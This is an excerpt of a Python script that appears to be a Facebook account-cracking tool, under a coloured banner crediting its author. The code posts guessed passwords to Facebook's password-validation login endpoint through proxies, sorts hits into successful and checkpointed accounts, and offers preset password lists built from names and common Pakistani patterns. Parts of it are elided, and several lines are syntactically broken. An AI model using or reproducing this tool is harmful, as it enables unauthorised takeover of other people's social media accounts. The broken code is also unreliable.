...
\033[1;92m    | [\033[1;31;1m©\033[1;92m]  [\033[1;31;1m©\033[1;92m] |​
 \033[1;92m   |  [\33[1;33m====\033[1;92m]  | [+] FORGET ON ALLAHA ALMIGHTY [+]
\033[1;92m╔══o00════════00o═════════════════════════╗
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mAuthor    :  \033[1;92m A Z A N         \033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mWhatsapp  :  \033[1;92m +923165456**          \033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mGitHub    : \033[1;92m  +92316546***        \033[1;31;1m █
...
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print(f'\n%s══════════════════════════════════════════\n [%s✓%s] %sCracking By AXB Usercrack...\n%s══════════════════════════════════════════'%(N,H,N,H,N))
        ...
        if cek_cp =="":
            ...
            for memek in cp:
                ...
                titid  = kontol.split(' • ')
                print(f'{N}══════════════════════════════════════════\n {H}LOGIN PROCESS')
                jalan(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[AXB-CP] ", "")}{N}')
                try:
...
class __chigoue__:
    ...
    def __metode__(self, cebok, user, pasw):
        ...
        try:
            for pw in pasw:
                ...
                po = session.post('+cebok+'/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
    ...
    def kombinasi_pw(self,url):
        ...
        print('%s[%s1%s] first,last,first123,last123,,first786,last786,786786,firstlast,lastfirst,firstlast123,lastfirst123,first12345,last1234,firstlast786'%(H,H,H))
        print('%s════════════════════════════════════════\n%s')
        print('%s[%s2%s] khankha,khan123,khan12345,khan786,786786,khan1122,khankhan12,janjan,ali456,aliali,786000,556677,009988,pak786'%(H,H,H))
        print('%s════════════════════════════════════════\n%s')
        print('%s[%s3%s] Name,Name123,Name1234,Name12345, Pakistan123'%s+Single Password Using Coma%s'%(H,H,H,H,H))
